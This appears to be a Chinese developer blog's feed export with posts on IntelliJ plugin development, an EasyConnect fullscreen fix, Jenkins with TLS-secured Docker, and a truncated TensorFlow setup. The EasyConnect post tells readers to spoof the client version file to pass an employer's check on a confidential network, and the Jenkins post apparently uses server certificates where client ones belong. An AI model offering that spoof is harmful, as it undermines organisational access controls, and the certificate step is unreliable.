class="token punctuation">&lt;/</span>component</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>application-components</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 项目级组件声明 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project-components</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>component</span><span class="token punctuation">&gt;</span></span>      <span class="token comment">&lt;!-- 接口和实现类相同 --&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface-class</span><span class="token punctuation">&gt;</span></span>com.foo.Component2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>component</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project-components</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 模块级组件声明 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module-components</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>component</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface-class</span><span class="token punctuation">&gt;</span></span>com.foo.Component3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface-class</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>implementation-class</span><span class="token punctuation">&gt;</span></span>com.foo.impl.Component3Impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>implementation-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>component</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module-components</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 定义各种动作 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>actions</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 自定义组 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestMenu<span class="token punctuation">"</span></span> <span class="token attr-name">text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>测试菜单<span class="token punctuation">"</span></span> <span class="token attr-name">popup</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>actions</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 插件定义的扩展点，以供其他插件扩展该插件 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>extensionPoints</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>extensionPoints</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>idea-plugin</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="项目配置"><a href="#项目配置" class="headerlink" title="项目配置"></a>项目配置</h3><p>build.gradle.kts 示例:</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">plugins <span class="token punctuation">{</span>  <span class="token comment">// Java support</span>  <span class="token function">id</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"java"</span></span><span class="token punctuation">)</span>  <span class="token comment">// Gradle IntelliJ Plugin</span>  <span class="token function">id</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"org.jetbrains.intellij"</span></span><span class="token punctuation">)</span> version <span class="token string-literal singleline"><span class="token string">"1.11.0"</span></span><span class="token punctuation">}</span><span class="token comment">// 组</span>group <span class="token operator">=</span> <span class="token string-literal singleline"><span class="token string">"com.example"</span></span><span class="token comment">// 插件版本号</span>version <span class="token operator">=</span> <span class="token string-literal singleline"><span class="token string">"1.0-SNAPSHOT"</span></span><span class="token comment">// 依赖仓库，这里使用了默认的 Maven 仓库, 也可以在此处添加自定义仓库, 比如网络不好可以设置国内仓库</span>repositories <span class="token punctuation">{</span>  maven <span class="token punctuation">{</span>    <span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"https://maven.aliyun.com/nexus/content/groups/public/"</span></span><span class="token punctuation">)</span>    <span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"https://oss.sonatype.org/content/repositories/snapshots/"</span></span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token function">mavenCentral</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token function">gradlePluginPortal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 配置 Gradle IntelliJ 插件, 可以参考: https://plugins.jetbrains.com/docs/intellij/tools-gradle-intellij-plugin.html</span>intellij <span class="token punctuation">{</span>  <span class="token comment">// 设置插件名称</span>  pluginName<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"CrazyGPT"</span></span><span class="token punctuation">)</span>  <span class="token comment">// 开发时沙盒中运行的 IDE 版本号</span>  version<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"2021.3.3"</span></span><span class="token punctuation">)</span>  <span class="token comment">// 开发时沙盒中运行的 IDE 版本, 使用社区版可以根据源码更方便的调试插件</span>  type<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"IC"</span></span><span class="token punctuation">)</span>  <span class="token comment">// 插件依赖</span>  plugins<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token function">listOf</span><span class="token punctuation">(</span><span class="token comment">/* Plugin Dependencies */</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>tasks <span class="token punctuation">{</span>  <span class="token comment">// 设置 JVM 兼容版本</span>  withType<span class="token operator">&lt;</span>JavaCompile<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    sourceCompatibility <span class="token operator">=</span> <span class="token string-literal singleline"><span class="token string">"11"</span></span>    targetCompatibility <span class="token operator">=</span> <span class="token string-literal singleline"><span class="token string">"11"</span></span>    options<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string-literal singleline"><span class="token string">"UTF-8"</span></span>  <span class="token punctuation">}</span>  <span class="token comment">// 设置 Kotlin 兼容版本</span>  withType<span class="token operator">&lt;</span>KotlinCompile<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    kotlinOptions<span class="token punctuation">.</span>jvmTarget <span class="token operator">=</span> <span class="token string-literal singleline"><span class="token string">"11"</span></span>  <span class="token punctuation">}</span>  <span class="token comment">// 设置 Gradle 版本</span>  wrapper <span class="token punctuation">{</span>    gradleVersion <span class="token operator">=</span> <span class="token string-literal singleline"><span class="token string">"7.6"</span></span>  <span class="token punctuation">}</span>  <span class="token comment">// 设置插件兼容版本</span>  patchPluginXml <span class="token punctuation">{</span>    <span class="token comment">// 插件版本</span>    version<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"1.0-SNAPSHOT"</span></span><span class="token punctuation">)</span>    <span class="token comment">// 支持的最早 IDE 版本</span>    sinceBuild<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"222.2680.4"</span></span><span class="token punctuation">)</span>    <span class="token comment">// 支持的最新 IDE 版本</span>    untilBuild<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"223.*"</span></span><span class="token punctuation">)</span>    changeNotes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"init."</span></span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  signPlugin <span class="token punctuation">{</span>    certificateChain<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"CERTIFICATE_CHAIN"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>    privateKey<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"PRIVATE_KEY"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>    password<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"PRIVATE_KEY_PASSWORD"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  publishPlugin <span class="token punctuation">{</span>    token<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">"PUBLISH_TOKEN"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>build.gradle.kts 配置与 plugin.xml 配置中有一些重复的配置项，如果两边都设置了，则以 build.gradle.kts 为准</p><h3 id="添加操作"><a href="#添加操作" class="headerlink" title="添加操作"></a>添加操作</h3><p><img src="/images/IDEAPluginAddAction1.png"></p><p>新建操作之后就会自动在 plugin.xml 中添加一个 action 标签，并且绑定该操作对应的类</p><p><img src="/images/IDEAPluginAddAction2.png"></p><p>在这个操作类中可以添加该操作的业务逻辑</p><h3 id="添加窗体"><a href="#添加窗体" class="headerlink" title="添加窗体"></a>添加窗体</h3><p><img src="/images/IDEAPluginAddWindow1.png"><br><img src="/images/IDEAPluginAddWindow2.png"></p><p>创建完窗体后，会自动创建窗体类(.java)以及一个同名的窗体设计文件(.form), 窗体设计文件打开之后就长这样，可以理解为 Web 开发的一个前端页面, 只不过是用 Java 写的</p><p><img src="/images/IDEAPluginAddWindow3.png"></p><p>在设计文件中可以拖拽需要的控件到窗体中，会自动在窗体类中添加该变量，在控件上可以创建侦听器，来添加对应控件的各种业务逻辑</p><h2 id="运行与调试项目"><a href="#运行与调试项目" class="headerlink" title="运行与调试项目"></a>运行与调试项目</h2><p>在 Gradle 中，运行 Tasks → intellij → runIde 就可以在沙盒中运行安装了此插件的 IDEA 了，版本为上面指定的 2021.3.3 社区版</p><p><img src="/images/IDEARunIDE.png"></p><p>运行一次之后，会自动添加运行配置，之后再想运行/调试就跟平时我们启动 Spring 项目一样，点上面的运行/调试按钮就可以了</p><p>在运行的插件 IDEA 中，可以看到插件已经安装上了</p><p><img src="/images/IDEAShowPluginInfo.png"></p><blockquote><p>为啥是英文的呢? 因为我本地 IDEA 安了很多插件，沙盒里的 IDEA 除了内置插件以外，只安装了此插件，没有中文插件</p></blockquote><h2 id="插件打包及发布"><a href="#插件打包及发布" class="headerlink" title="插件打包及发布"></a>插件打包及发布</h2><p>与 Maven 类似，这里运行 Gradle buildPlugin 就可以打包了，会将所有依赖包一起打一个可以手动从磁盘安装的压缩包</p><p><img src="/images/IDEABuildPlugin.png"></p><p>打包好的插件安装包会存放在项目的 /build/distributions/ 目录下</p><p><img src="/images/IDEAPluginZip.png"></p><p>把压缩包发给你的朋友就可以让他们体验以下你写的插件了</p><p>如果你想要发布你的插件到 JetBrains 插件仓库的话，执行 Gradle publishPlugin 就可以发布了，但是这需要你配置好你的 JetBrains 账号及 Token</p><blockquote><p>我水平比较菜，还没到发布插件的成都，想了解的可以自行研究研究…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JetBrains Plugin </tag>
            
            <tag> Plugin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS 使用 Easyconnect 远程桌面无法全屏显示</title>
      <link href="/2022/06/17/macosunablefullscreen/"/>
      <url>/2022/06/17/macosunablefullscreen/</url>
      
        <content type="html"><![CDATA[<p>疫情原因，需要远程办公，但是办公环境涉密，不能连外网，所以要用<strong>指定版本</strong>的 Easyconnect 软件连接远程桌面进行远程办公，然后，使用 Mac 客户端的我就出现了神器的界面…</p><p><img src="/../images/MacOSEasyconnectRemoteDesktop.png" alt="img_1.png"></p><p>偌大一个屏幕，远程界面只显示四分之一，这还没完，你看到的鼠标位置是相对于全屏的鼠标位置，而鼠标实际操作位置则是相对于全屏位置等比映射到小屏幕上…</p><p>就比如我要双击回收站图标，鼠标直接过去点，点不到的！要把鼠标挪到红色背景左上角，靠下一点的位置才能点到那个回收站！</p><p>我太难了…</p><p>在 Easyconnect 官方社区查到如下<a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=161747">资料</a>:</p><blockquote><p>当前问题是 2021 年 11 月 3 日 mac 客户端更新后出现的，这次更新中没有更新远程应用功能，并且未修改远程相关代码，初步判断是跟编译有关系，可以重装我们对应修复此问题的 Easyconnect 客户端解决</p></blockquote><p>文中有修复问题的版本下载链接，但是各单位远程连接服务会校验 Easyconnect 客户端的版本, 使用文中的安装包不一定好使</p><p>若按照文中的安装包仍然不好使，可参考下面的步骤进行解决</p><ol><li>在<a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=161747">该页面</a>下载对应的修复版本包，下载后解压备用</li><li>查看公司提供的 Easyconnect 版本信息<ol><li>安装单位 vpn 服务提供的客户端</li><li>打开终端执行下面的命令查看版本信息 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /Applications/EasyConnect.app/Contents/Resources/conf/Version.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>打开第 <code>1</code> 步解压后的 <code>Version.xml</code> 文件，将上一步输出的内容覆盖粘贴进去，保存退出</li></ol></li><li>卸载公司提供的 Easyconnect 客户端</li><li>安装第 <code>1</code> 步解压出来的 <code>dmg</code> 文件</li><li>安装完成后双击第 <code>1</code> 步解压出来的 <code>version</code> 程序</li></ol><p>此时，无法全屏的问题得到解决，并且客户端也能过通过公司的版本校验了…</p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Easyconnect </tag>
            
            <tag> 远程桌面 </tag>
            
            <tag> 全屏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jenkins 构建并运行 Docker 镜像</title>
      <link href="/2022/06/06/jenkinsdocker/"/>
      <url>/2022/06/06/jenkinsdocker/</url>
      
        <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>Jenkins 环境</li><li>Jenkins 服务器能够连接的 Docker 环境</li><li>Dockerfile 文件</li></ul><h2 id="创建连接-Docker-的证书"><a href="#创建连接-Docker-的证书" class="headerlink" title="创建连接 Docker 的证书"></a>创建连接 Docker 的证书</h2><p>Jenkins 的 Docker 插件只能通过 TCP 方式进行连接，安全起见，我们需要创建用来连接 Docker 的证书，我已经被黑了 3 次了，受够了！</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建根证书 RSA 私钥: 此处需要两次输入密码，请务必记住该密码，在后面步骤会用到</span>openssl genrsa <span class="token parameter variable">-aes256</span> <span class="token parameter variable">-out</span> docker-ca-key.pem <span class="token number">4096</span><span class="token comment"># 创建 CA 证书，以上一步生成的私钥创建证书，也就是自签证书，也可从第三方 CA 机构签发</span><span class="token comment"># 输入国家代码，州，市，组织名称，组织单位，你的名字，邮箱地址</span>openssl req <span class="token parameter variable">-new</span> <span class="token parameter variable">-x509</span> <span class="token parameter variable">-days</span> <span class="token number">3650</span> <span class="token parameter variable">-key</span> docker-ca-key.pem <span class="token parameter variable">-sha256</span> <span class="token parameter variable">-out</span> docker-ca.pem<span class="token comment"># 创建服务端私钥:</span>openssl genrsa <span class="token parameter variable">-out</span> server-key.pem <span class="token number">4096</span><span class="token comment"># 创建服务端签名请求证书文件: 其中的 IP 地址为自己服务器IP地址</span>openssl req <span class="token parameter variable">-subj</span> <span class="token string">"/CN=192.168.10.38"</span> <span class="token parameter variable">-sha256</span> <span class="token parameter variable">-new</span> <span class="token parameter variable">-key</span> server-key.pem <span class="token parameter variable">-out</span> server.csr<span class="token comment"># 创建 extfile.cnf 的配置文件: 其中 IP 地址改为自己服务器IP地址</span><span class="token builtin class-name">echo</span> subjectAltName <span class="token operator">=</span> IP:192.168.10.38,IP:0.0.0.0 <span class="token operator">&gt;&gt;</span> extfile.cnf<span class="token builtin class-name">echo</span> extendedKeyUsage <span class="token operator">=</span> serverAuth <span class="token operator">&gt;&gt;</span> extfile.cnf<span class="token comment"># 创建签名生效的服务端证书文件:</span>openssl x509 <span class="token parameter variable">-req</span> <span class="token parameter variable">-days</span> <span class="token number">3650</span> <span class="token parameter variable">-sha256</span> <span class="token parameter variable">-in</span> server.csr <span class="token parameter variable">-CA</span> docker-ca.pem <span class="token parameter variable">-CAkey</span> docker-ca-key.pem <span class="token parameter variable">-CAcreateserial</span> <span class="token parameter variable">-out</span> server-cert.pem <span class="token parameter variable">-extfile</span> extfile.cnf<span class="token comment"># 创建客户端私钥:</span>openssl genrsa <span class="token parameter variable">-out</span> client-key.pem <span class="token number">4096</span><span class="token comment"># 创建客户端签名请求证书文件:</span>openssl req <span class="token parameter variable">-subj</span> <span class="token string">'/CN=client'</span> <span class="token parameter variable">-new</span> <span class="token parameter variable">-key</span> client-key.pem <span class="token parameter variable">-out</span> client.csr<span class="token comment"># extfile.cnf 文件中增加配置:</span><span class="token builtin class-name">echo</span> extendedKeyUsage <span class="token operator">=</span> clientAuth <span class="token operator">&gt;&gt;</span> extfile.cnf<span class="token comment"># 创建签名生效的客户端证书文件:</span>openssl x509 <span class="token parameter variable">-req</span> <span class="token parameter variable">-days</span> <span class="token number">3650</span> <span class="token parameter variable">-sha256</span> <span class="token parameter variable">-in</span> client.csr <span class="token parameter variable">-CA</span> docker-ca.pem <span class="token parameter variable">-CAkey</span> docker-ca-key.pem <span class="token parameter variable">-CAcreateserial</span> <span class="token parameter variable">-out</span> client-cert.pem <span class="token parameter variable">-extfile</span> extfile.cnf<span class="token comment"># 删除无用文件:</span><span class="token function">rm</span> <span class="token parameter variable">-v</span> client.csr server.csr<span class="token comment"># 为证书文件授权:</span><span class="token function">chmod</span> <span class="token parameter variable">-v</span> 0400 docker-ca-key.pem server-key.pem client-key.pem<span class="token function">chmod</span> <span class="token parameter variable">-v</span> 0444 docker-ca.pem server-cert.pem client-cert.pem<span class="token comment"># 查看证书有效期</span>openssl x509 <span class="token parameter variable">-in</span> docker-ca.pem <span class="token parameter variable">-noout</span> <span class="token parameter variable">-dates</span><span class="token comment"># 创建存放证书的目录，并将所需的证书文件拷进去</span><span class="token function">mkdir</span> /etc/docker/cert<span class="token function">cp</span> docker-ca.pem /etc/docker/cert/<span class="token function">cp</span> server-cert.pem /etc/docker/cert/<span class="token function">cp</span> server-key.pem /etc/docker/cert/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上 <code>docker-ca.pem</code> <code>server-cert.pem</code> <code>server-key.pem</code> 这三个是我们客户端调用所需的证书文件</p><h2 id="配置-Docker-支持-TLS-连接"><a href="#配置-Docker-支持-TLS-连接" class="headerlink" title="配置 Docker 支持 TLS 连接"></a>配置 Docker 支持 TLS 连接</h2><p>编辑 docker.service 配置文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /lib/systemd/system/docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将原 <code>ExecStart=</code> 行注释，添加一行:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/dockerd <span class="token parameter variable">-H</span> fd:// <span class="token parameter variable">-H</span> tcp://0.0.0.0:2375 <span class="token parameter variable">--tlsverify</span> <span class="token parameter variable">--tlscacert</span><span class="token operator">=</span>/etc/docker/cert/docker-ca.pem <span class="token parameter variable">--tlscert</span><span class="token operator">=</span>/etc/docker/cert/server-cert.pem <span class="token parameter variable">--tlskey</span><span class="token operator">=</span>/etc/docker/cert/server-key.pem <span class="token parameter variable">--containerd</span><span class="token operator">=</span>/run/containerd/containerd.sock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>此处设置 docker 远程端口为 2375，可根据需要修改</p></blockquote><p>刷新配置，重启 Docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl daemon-reload <span class="token operator">&amp;&amp;</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Jenkins-配置-Docker-集群"><a href="#Jenkins-配置-Docker-集群" class="headerlink" title="Jenkins 配置 Docker 集群"></a>Jenkins 配置 Docker 集群</h2><ol><li>进入 <code>Dashbord</code> -&gt; <code>系统管理</code> -&gt; <code>节点管理</code> -&gt; <code>Configure Clouds</code> 配置集群界面</li><li><code>Add a new cloud</code> 选择 Docker</li><li>点击 <code>Docker Cloud details...</code> 按钮<ol><li>设置 Docker 集群名称</li><li>设置 <code>Docker Host URI</code>: <code>tcp://192.168.10.38:2375</code><blockquote><p>此处 ip 为此 Jenkins 服务器能够连接到的 Docker 服务器 ip 地址</p></blockquote></li><li>设置 <code>Server credentials</code><ol><li><code>添加</code> 连接 Docker 集群的凭证<ol><li>选择<code>全局凭证</code></li><li>类型选择 <code>X.509 Client Certificate</code></li><li>范围选择<code>全局</code></li><li>Client Key 点击添加，将上面生成的 <code>server-key.pem</code> 文本内容粘贴进去</li><li>Client Certificate 将上面生成的 <code>server-cert.pem</code> 文本内容粘贴进去</li><li>Server CA Certificate 将上面生成的 <code>docker-ca.pem</code> 文本内容粘贴进去</li><li>ID 设置为容易辨认的凭证名称 <code>docker-38-cert</code>，避免混淆</li></ol></li><li>选择上面添加的凭证 <code>docker-38-cert</code></li></ol></li><li>勾选 <code>Enabled</code> 选项</li></ol></li></ol><p><img src="/images/JenkinsDockerConfig.png" alt="img.png"></p><h2 id="Jenkins-配置构建步骤"><a href="#Jenkins-配置构建步骤" class="headerlink" title="Jenkins 配置构建步骤"></a>Jenkins 配置构建步骤</h2><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>在项目配置中的<code>构建</code>步骤中添加 <code>Build / Publish Docker Image</code>:</p><p><img src="/images/BuildPublishDockerImage.png" alt="img.png"></p><h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><p>继续添加构建步骤 <code>执行 shell</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除中间镜像</span><span class="token function">docker</span> rmi <span class="token parameter variable">-f</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> images <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"^&lt;none&gt;"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $3}'</span><span class="token variable">)</span></span><span class="token comment"># 删除此项目正在运行的 Docker 容器</span><span class="token assign-left variable">cid</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token operator">|</span> <span class="token function">grep</span> $CONTAINER_NAME <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print $1}'</span><span class="token variable">)</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> x<span class="token string">"<span class="token variable">$cid</span>"</span> <span class="token operator">!=</span> x <span class="token punctuation">]</span>    <span class="token keyword">then</span>    <span class="token function">docker</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable">$cid</span><span class="token keyword">fi</span><span class="token comment"># 启动 Docker 容器</span><span class="token function">docker</span> run <span class="token parameter variable">-itd</span> <span class="token parameter variable">--name</span> <span class="token variable">$CONTAINER_NAME</span> <span class="token parameter variable">-p</span> <span class="token variable">$API_PORT</span>:80 <span class="token parameter variable">--restart</span> always <span class="token variable">$IMAGE_NAME</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Jenkins </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Jenkins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TensorFlow 机器学习环境搭建</title>
      <link href="/2022/04/06/mlenvironment/"/>
      <url>/2022/04/06/mlenvironment/</url>
      
        <content type="html"><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul><li><p>系统: Windows 10 64位</p><p><a href="https://github.com/tensorflow/build#community-supported-tensorflow-builds">其他平台的构建表</a></p></li><li><p>显卡: 支持 CUDA 的 Nvidia 显卡</p></li></ul><h3 id="安装-CUDA"><a href="#安装-CUDA" class="headerlink" title="安装 CUDA"></a>安装 CUDA</h3><p>按照<a href="https://www.tensorflow.org/install/gpu#software_requirements">官方系统软件要求</a>安装</p><ul><li>安装 <a href="https://www.nvidia.com/drivers">NVIDIA 驱动包</a></li><li>安装 <a href="https://developer.nvidia.com/cuda-toolkit-archive">CUDA 工具包</a>, 添加环境变量</li><li>安装 <a href="https://developer.nvidia.com/rdp/cudnn-archive">cuDNN</a><blockquote><p>解压 cnDNN 压缩包，将其中的文件夹复制到 CUDA 的安装目录中，与原文件夹合并(不会冲突)：</p><p><code>...\NVIDIA GPU Computing Toolkit\CUDA\v11.6\</code></p></blockquote></li><li>安装 <a href="https://docs.nvidia.com/deeplearning/cudnn/install-guide/index.html#install-zlib-windows">zlib</a>, 否则不支持卷积神经网络的训练<blockquote><p>解压后将 <code>zlibwapi.dll</code> 拷贝到 <code>...\NVIDIA GPU Computing Toolkit\CUDA\v11.6\bin\</code> 目录下</p><p>安装 CUDA 时已设置环境变量，这里不用再配了</p></blockquote></li></ul><h2 id="安装-Python"><a href="#安装-Python" class="headerlink" title="安装 Python"></a>安装 Python</h2><p>我用的 <a href="https://repo.anaconda.com/">Anaconda3</a>, 安装完事 Python3.9 的版本</p><h3 id="Anaconda-常用命令"><a href="#Anaconda-常用命令" class="headerlink" title="Anaconda 常用命令"></a>Anaconda 常用命令</h3><table><thead><tr><th align="center">操作</th><th align="center">命令</th></tr></thead><tbody><tr><td align="center">新建环境</td><td align="center"><code>conda create -n ENV_NAME python=3.8.8</code></td></tr><tr><td align="center">激活环境</td><td align="center"><code>conda activate ENV_NAME</code></td></tr><tr><td align="center">安装包</td><td align="center"><code>conda install PACKAGE_NAME</code></td></tr><tr><td align="center">卸载包</td><td align="center"><code>conda remove PACKAGE_NAME</code></td></tr><tr><td align="center">显示所有已安装的包</td><td align="center"><code>conda list</code></td></tr><tr><td align="center">退出环境</td><td align="center"><code>conda deactivate</code></td></tr><tr><td align="center">删除环境</td><td align="center"><code>conda env remove -n ENV_NAME</code></td></tr><tr><td align="center">显示所有已安装的环境</td><td align="center"><code>conda env list</code></td></tr></tbody></table><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 添加清华源</span>conda config <span class="token parameter variable">--add</span> channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/freeconda config <span class="token parameter variable">--add</span> channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main<span class="token comment"># 